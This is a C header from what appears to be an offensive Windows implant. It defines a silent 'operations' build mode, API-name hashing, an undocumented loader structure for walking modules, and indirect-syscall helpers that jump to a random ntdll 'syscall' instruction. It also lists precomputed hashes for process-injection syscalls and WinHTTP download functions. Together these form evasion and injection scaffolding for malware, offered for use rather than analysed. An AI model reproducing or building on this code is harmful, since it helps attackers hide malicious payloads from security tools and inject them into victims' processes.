#ifndef _COMMON_H
#define _COMMON_H

#include <windows.h>
#include <winternl.h>

// =============================================
// Build modes:
//   -DDEBUG_MODE    = Test mode with printf output (for development)
//   (default)       = Silent mode, no console output (for operations)
// =============================================
#ifdef DEBUG_MODE
    #define IMPLANT_PRINT(...) printf(__VA_ARGS__)
#else
    #define IMPLANT_PRINT(...) ((void)0)
#endif

// =============================================
// Configuration
// =============================================
#define RANGE       0xFF
#define UP          (-32)
#define DOWN        (32)

// =============================================
// Hashing seed (Jenkins One-At-A-Time)
// =============================================
#define INITIAL_SEED    7

// =============================================
// Hashing macros
// =============================================
#define HASHA(API)  (HashStringJenkinsOneAtATime32BitA((PCHAR)(API)))
#define HASHW(API)  (HashStringJenkinsOneAtATime32BitW((PWCHAR)(API)))

// =============================================
// Undocumented LDR_DATA_TABLE_ENTRY
// Full version from Windows Vista Kernel Structures
// =============================================
typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    PVOID       DllBase;
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG       Flags;
    WORD        LoadCount;
    WORD        TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

// =============================================
// Syscall structures
// =============================================
typedef struct _NT_SYSCALL {
    DWORD   dwSSn;                  // Syscall Service Number
    DWORD   dwSyscallHash;          // Hash of syscall name
    PVOID   pSyscallAddress;        // Address of syscall function in ntdll
    PVOID   pSyscallInstAddress;    // Address of a random 'syscall' instruction in ntdll (for indirect syscalls)
} NT_SYSCALL, *PNT_SYSCALL;

// =============================================
// NTDLL configuration (cached export table)
// =============================================
typedef struct _NTDLL_CONFIG {
    ULONG_PTR   uModule;                // ntdll base address
    PDWORD      pdwArrayOfAddresses;    // AddressOfFunctions
    PDWORD      pdwArrayOfNames;        // AddressOfNames
    PWORD       pwArrayOfOrdinals;      // AddressOfNameOrdinals
    DWORD       dwNumberOfNames;        // NumberOfNames
} NTDLL_CONFIG, *PNTDLL_CONFIG;

// =============================================
// Syscall hash values (CRC32b)
// Precomputed at compile time - update per build
// =============================================
#define NtAllocateVirtualMemory_HASH        0x3FED6A1D
#define NtProtectVirtualMemory_HASH         0x0D26E443
#define NtCreateThreadEx_HASH               0x052DF4B1
#define NtWaitForSingleObject_HASH          0x4EA334B3
#define NtWriteVirtualMemory_HASH           0xD96A0F14
#define NtOpenProcess_HASH                  0x4A0D086C
#define NtClose_HASH                        0x18C89659
#define NtQuerySystemInformation_HASH       0x7ACE52EF
#define NtCreateSection_HASH                0x1715A1FE
#define NtMapViewOfSection_HASH             0x46A03155
#define NtUnmapViewOfSection_HASH           0x644261DD
#define NtQueueApcThread_HASH               0x49B40530
#define NtResumeThread_HASH                 0xC61B11DC
#define NtDelayExecution_HASH               0x51A773FE

// Module hashes (UPPERCASE names)
#define NTDLL_DLL_HASH                      0x5CCC2BBF
#define KERNEL32_DLL_HASH                   0xE50F273B
#define KERNELBASE_DLL_HASH                 0x04876709
#define USER32_DLL_HASH                     0x974199D8
#define ADVAPI32_DLL_HASH                   0x504F5E39
#define WINHTTP_DLL_HASH                    0x0317924D

// WinAPI function hashes
#define LoadLibraryA_HASH                   0x97C574BC
#define LoadLibraryW_HASH                   0xB5C2304D
#define WinHttpOpen_HASH                    0xAF4AFECF
#define WinHttpConnect_HASH                 0x42B1DF1D
#define WinHttpOpenRequest_HASH             0x5A6BD40F
#define WinHttpSendRequest_HASH             0xD05EE6BA
#define WinHttpReceiveResponse_HASH         0xAA28EE06
#define WinHttpReadData_HASH                0x834CFBE5
#define WinHttpCloseHandle_HASH             0x256639D8

// =============================================
// Syscall collection
// =============================================
typedef struct _NTAPI_FUNC {
    NT_SYSCALL  NtAllocateVirtualMemory;
    NT_SYSCALL  NtProtectVirtualMemory;
    NT_SYSCALL  NtCreateThreadEx;
    NT_SYSCALL  NtWaitForSingleObject;
    NT_SYSCALL  NtWriteVirtualMemory;
    NT_SYSCALL  NtOpenProcess;
    NT_SYSCALL  NtClose;
    NT_SYSCALL  NtQuerySystemInformation;
    NT_SYSCALL  NtCreateSection;
    NT_SYSCALL  NtMapViewOfSection;
    NT_SYSCALL  NtUnmapViewOfSection;
    NT_SYSCALL  NtQueueApcThread;
    NT_SYSCALL  NtResumeThread;
    NT_SYSCALL  NtDelayExecution;
} NTAPI_FUNC, *PNTAPI_FUNC;

// =============================================
// Indirect syscall helpers (ASM)
// =============================================
extern VOID  SetSSn(DWORD dwSSn, PVOID pSyscallInstAddress);
extern NTSTATUS RunSyscall(...);

// =============================================
// Convenience macro
// =============================================
#define SET_SYSCALL(NtSys) (SetSSn((DWORD)(NtSys).dwSSn, (PVOID)(NtSys).pSyscallInstAddress))

#endif // _COMMON_H
